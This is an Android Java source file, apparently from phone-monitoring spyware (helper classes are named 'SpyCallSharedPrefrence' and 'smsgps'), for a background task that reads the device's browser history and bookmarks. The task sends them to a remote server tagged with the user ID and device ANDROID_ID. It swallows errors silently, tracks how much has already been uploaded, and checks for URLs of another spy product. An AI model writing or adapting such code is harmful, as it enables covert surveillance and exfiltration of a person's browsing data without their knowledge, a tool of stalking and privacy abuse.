/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Browser;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

@SuppressLint("SimpleDateFormat")
public class BrowserAsyncTask extends AsyncTask<String, Void, String> {

	private static final String TAG = "BrowserAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;

	/**
	 * 
	 */
	public BrowserAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}

	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {

		try{
			getBrowserDetail();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedBrowser();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}

	/***************** getBrowserDetail() Start**************/

	private void getBrowserDetail() {

		try{
			String browserDetail="";    		
			final Cursor managedCursor1 = ctx.getContentResolver().query(Browser.BOOKMARKS_URI,Browser.HISTORY_PROJECTION, null, null, null);
			final int totalBrowserCount=managedCursor1.getCount();
			final int preBrowserCount=SpyCallSharedPrefrence.getsaveBROWSER_PreCount(ctx);
			final int remaningBrowserCount=totalBrowserCount-preBrowserCount;

			Log.i("Remaining Count", remaningBrowserCount+"");
			if(remaningBrowserCount>0){
				ctx.getContentResolver();
				final String[] proj = new String[] {Browser.BookmarkColumns.TITLE,Browser.BookmarkColumns.URL,Browser.BookmarkColumns.DATE};			
				final Cursor mCur = ctx.getContentResolver().query(Browser.BOOKMARKS_URI,proj, null, null, Browser.BookmarkColumns.DATE+" LIMIT "+preBrowserCount+","+remaningBrowserCount);

				if (null!=mCur) {
					while (mCur.moveToNext()) {
						String title=mCur.getString(0);
						
						final String strRem="/",strrep=" ";
						final String strRem1=" . ",strrep1=" ";

						title=title.replaceAll(strRem, strrep);
						title=title.replaceAll(strRem1, strrep1);
						
						final String titleUrl=mCur.getString(1);
						
						if(titleUrl.contains("highster"))
						{
							System.out.println("AVAILABLE");
						}
						
						String dateTime=mCur.getString(2);
						String brTime;
						if(dateTime==null){
							dateTime="121212342323";  
						}
						final long xyz=Long.valueOf(dateTime);
						//xyz=xyz/1000;
						
						final Timestamp st = new Timestamp(xyz);
						final java.util.Date date1 = new java.util.Date(st.getTime());
						//   java.sql.Date date2 = new java.sql.Date(st.getTime());
						final DateFormat df = DateFormat.getDateInstance();
						////System.out.println("Time Zone :" + df.getTimeZone().getID());
						final TimeZone zone1 = TimeZone.getTimeZone(df.getTimeZone().getID()); // For example...
						final DateFormat format1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); // Put your pattern here
						format1.setTimeZone(zone1);
						brTime = format1.format(date1);

						final String str1Browser = Uri.encode(titleUrl) + "|||" + Uri.encode(title) + "|||"+brTime/* Uri.encode(BRtime)*/;

						if (browserDetail != "") {
							browserDetail = str1Browser + "##KM##" + browserDetail;
						} else {
							browserDetail = str1Browser;
						}
					}
					try{

						if(Utility.isNetworkAvailable(ctx)){
							int browserPreCount=preBrowserCount+remaningBrowserCount;
							new YourAsyncTaskBrowserDetail()
							.execute(/* PreBrowserCount+remaningBrowserCount */browserDetail,browserPreCount+"");
						}
					}
					
					catch (Exception e) {
						//e.printStackTrace();
					}
					//CellPoliceSharedPreferences.saveBROWSER_PreCount(ctx, PreBrowserCount+remaningBrowserCount);
				}
			}
		}
		catch (Exception e) {
			//e.printStackTrace();
		}

	}
	
/*	private static final void deleteHistoryWhere(ContentResolver cr,
            String whereClause) {
        Cursor c = null;
        try { 
            c = cr.query(Browser.BOOKMARKS_URI,
            		Browser.HISTORY_PROJECTION,
                whereClause,
                null,
                null);
            if (c.moveToFirst()) {
                final WebIconDatabase iconDb = WebIconDatabase.getInstance();
                 Delete favicons, and revert bookmarks which have been visited
                 * to simply bookmarks.
                 
                StringBuffer sb = new StringBuffer();
                boolean firstTime = true;
                do {
                    String url = c.getString(Browser.HISTORY_PROJECTION_URL_INDEX);
                    boolean isBookmark =
                        c.getInt(Browser.HISTORY_PROJECTION_BOOKMARK_INDEX) == 1;
                    if (isBookmark) {
                        if (firstTime) {
                            firstTime = false;
                        } else {
                            sb.append(" OR ");
                        }
                        sb.append("( _id = ");
                        sb.append(c.getInt(0));
                        sb.append(" )");
                    } else {
                        iconDb.releaseIconForPageUrl(url);
                    }
                } while (c.moveToNext());

                if (!firstTime) {
                    ContentValues map = new ContentValues();
                    map.put(BookmarkColumns.VISITS, 0);
                    map.put(BookmarkColumns.DATE, 0);
                     FIXME: Should I also remove the title? 
                    cr.update(Browser.BOOKMARKS_URI, map, sb.toString(), null);
                }

                String deleteWhereClause = BookmarkColumns.BOOKMARK + " = 0";
                if (whereClause != null) {
                    deleteWhereClause += " AND " + whereClause;
                }
                cr.delete(Browser.BOOKMARKS_URI, deleteWhereClause, null);
            }
        } catch (IllegalStateException e) {
            Log.e("DELETEURLs", "deleteHistoryWhere", e);
            return;
        } finally {
            if (c != null) c.close();
        }
    }*/


	/**
	 * posting data on server 
	 */
	class YourAsyncTaskBrowserDetail extends AsyncTask<String, Void, Void> {

		private String getResponceBrowser;
		
		/**
		 * 
		 */
		public YourAsyncTaskBrowserDetail() {
			// TODO Auto-generated constructor stub
		}
		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params){        
			//make your request here - it will run in a different thread
			try{	
				String getUserID_SP =  HinjAppPreferenceUtils.getRaId(ctx);
				String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
				
				//Log.i(TAG, params[0]+ "null");
				mRequestPostClass = new RequestPost();
				getResponceBrowser = mRequestPostClass.postBrowserPost(params[0], getUserID_SP,android_id );
				//Log.i(TAG, getResponceBrowser);
				final JSONObject responseObject = new JSONObject(getResponceBrowser);
				//final JSONArray responseArray = responseObject.getJSONArray("response");
				final JSONObject JsonResponse =responseObject.getJSONObject("response");
				if (JsonResponse.getString("success").toString().contains("success")) {
					SpyCallSharedPrefrence.saveBROWSER_PreCount(ctx, Integer.parseInt(params[1]));	
				}
			}
			catch (JSONException e){
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			Log.i(TAG, getResponceBrowser);
			//getAllInstalledApp();
		}
	}
	/********* getBrowserDetail() End*********************************/
	//**************************Date Function
	
	   private String usingDateFormatter(long input){
			Calendar cal1 = Calendar.getInstance();
			TimeZone tz1 = cal1.getTimeZone();
			/* debug: is it local time? */
			Log.d("Time zone: ", tz1.getDisplayName());
			/* date formatter in local timezone */
			SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			sdf1.setTimeZone(tz1);
			/* print your timestamp and double check it's the date you expect */
			long timestamp1 = Long.valueOf(input);
			String getDatetime = sdf1.format(new Date(timestamp1 * 1000)); // I assume your timestamp is in seconds and you're converting to milliseconds?
		    
	        return getDatetime;
	 
	    }
}
